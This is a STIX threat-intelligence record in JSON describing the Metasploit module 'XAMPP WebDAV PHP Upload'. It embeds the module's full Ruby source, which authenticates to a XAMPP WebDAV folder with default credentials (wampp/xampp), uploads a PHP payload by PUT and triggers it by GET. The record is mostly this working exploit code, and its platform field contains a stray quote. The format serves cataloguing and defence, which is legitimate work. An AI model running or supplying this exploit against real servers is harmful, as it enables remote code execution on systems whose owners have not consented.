{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--bbd227fc-219a-4eb4-ba10-ec4abf18901e",
    "created": "2024-08-14T16:54:37.323065Z",
    "modified": "2024-08-14T16:54:37.323069Z",
    "name": "XAMPP WebDAV PHP Upload",
    "description": " This module exploits weak WebDAV passwords on XAMPP servers. It uses supplied credentials to upload a PHP payload and execute it. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/xampp_webdav_upload_php.rb",
            "external_id": "xampp_webdav_upload_php.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::EXE\n\n  def initialize\n    super(\n      'Name'        => 'XAMPP WebDAV PHP Upload',\n      'Description'    => %q{\n          This module exploits weak WebDAV passwords on XAMPP servers.\n          It uses supplied credentials to upload a PHP payload and\n          execute it.\n      },\n      'Author'      => ['theLightCosine'],\n      'Platform'    => 'php',\n      'Arch'        => ARCH_PHP,\n      'Targets'     =>\n        [\n          [ 'Automatic', { } ],\n        ],\n      'DisclosureDate' => 'Jan 14 2012',\n      'DefaultTarget'  => 0\n    )\n\n    register_options(\n      [\n        OptString.new('PATH', [ true,  \"The path to attempt to upload\", '/webdav/']),\n        OptString.new('FILENAME', [ false ,  \"The filename to give the payload. (Leave Blank for Random)\"]),\n        OptString.new('USERNAME', [true, 'The HTTP username to specify for authentication', 'wampp']),\n        OptString.new('PASSWORD', [true, 'The HTTP password to specify for authentication', 'xampp'])\n      ])\n  end\n\n\n\n  def exploit\n    uri = build_path\n    print_status \"Uploading Payload to #{uri}\"\n    res = send_request_cgi({\n          'uri'     => uri,\n          'method'  => 'PUT',\n          'data'\t=> payload.raw,\n          'username' => datastore['USERNAME'],\n          'password' => datastore['PASSWORD']\n        }, 25)\n    unless (res and res.code == 201)\n      print_error \"Failed to upload file!\"\n      return\n    end\n    print_status \"Attempting to execute Payload\"\n    res = send_request_cgi({\n      'uri'          =>  uri,\n      'method'       => 'GET'\n    }, 20)\n  end\n\n\n\n  def build_path\n    uri_path = normalize_uri(datastore['PATH'])\n    uri_path << '/' unless uri_path.ends_with?('/')\n    if datastore['FILENAME']\n      uri_path << datastore['FILENAME']\n      uri_path << '.php' unless uri_path.ends_with?('.php')\n    else\n      uri_path << Rex::Text.rand_text_alphanumeric(7)\n      uri_path << '.php'\n    end\n    return uri_path\n  end\nend\n",
    "x_mitre_disclosure_date": "Jan 14 2012",
    "x_mitre_platforms": [
        "php'"
    ]
}